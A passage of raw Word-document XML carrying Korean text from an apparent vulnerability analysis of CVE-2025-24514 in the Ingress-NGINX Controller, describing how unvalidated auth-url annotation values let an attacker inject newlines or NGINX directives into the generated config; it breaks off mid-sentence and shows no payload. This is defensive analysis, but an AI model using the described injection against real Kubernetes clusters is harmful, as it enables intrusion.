    <w:p w14:paraId="3744C8FE" w14:textId="77777777" w:rsidR="00C76F4F" w:rsidRPr="00C76F4F" w:rsidRDefault="00C76F4F" w:rsidP="00C76F4F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="72"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Go 템플릿 변환</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>: 이 모델을 Go 템플릿에 입력값으로 넣어 NGINX 설정 파일을 생성합니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64DF7B55" w14:textId="77777777" w:rsidR="00C76F4F" w:rsidRPr="00C76F4F" w:rsidRDefault="00C76F4F" w:rsidP="00C76F4F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="72"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>설정 파일 적용</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>: 생성된 nginx.conf 파일을 컨테이너 내 파일시스템에 저장합니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C8B5B85" w14:textId="77777777" w:rsidR="00C76F4F" w:rsidRPr="00C76F4F" w:rsidRDefault="00C76F4F" w:rsidP="00C76F4F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="72"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>NGINX 프로세스 reload</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>: 설정 파일이 변경되면 NGINX 프로세스를 reload하여 새로운 설정을 적용합니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3942EFE2" w14:textId="47481B16" w:rsidR="00C76F4F" w:rsidRPr="00C76F4F" w:rsidRDefault="00C76F4F" w:rsidP="00C76F4F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>이 과정에서 annotation 등 커스텀 설정이 직접 NGINX 설정에 반영되며, 입력값 검증이 미흡할 경우 보안 취약점이 발생할 수 있습니</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16041E4D" w14:textId="77777777" w:rsidR="00C76F4F" w:rsidRDefault="00C76F4F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cstheme="majorBidi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="365F91" w:themeColor="accent1" w:themeShade="BF"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="73B55AE5" w14:textId="1F0F4125" w:rsidR="00E27F85" w:rsidRPr="00BC09C2" w:rsidRDefault="00B854B5">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BC09C2">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">4. </w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>취약점 상세 분석</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="251F15D5" w14:textId="77777777" w:rsidR="00C76F4F" w:rsidRDefault="00BC09C2" w:rsidP="00BC09C2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BC09C2">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">4.1 </w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>취약점의</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F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6F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>근본</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F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6F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>원인</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>: auth-url annotation</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>의</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F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6F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>입력값</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F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6F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>검증</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F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6F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>미흡</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72A3C5E1" w14:textId="77777777" w:rsidR="00F9143F" w:rsidRPr="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>CVE-2025-24514</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>의</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>근본</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>원인은</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ingress-NGINX Controller</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>가</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ingress </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>리소스의</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> auth-url annotation </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>값을</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> NGINX </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>설정</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>파일에</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>삽입할</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>때</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>입력값에</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>대한</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>적절한</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>검증과</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>이스케이프</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>처리를</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>수행하지</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>않은</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>데</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>있습니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FEB3889" w14:textId="77777777" w:rsidR="00F9143F" w:rsidRPr="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>이로</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>인해</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>공격자는</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> annotation </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>값에</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>개행</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>문자나</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> NGINX directive</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>를</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>삽입하여</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>의도하지</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
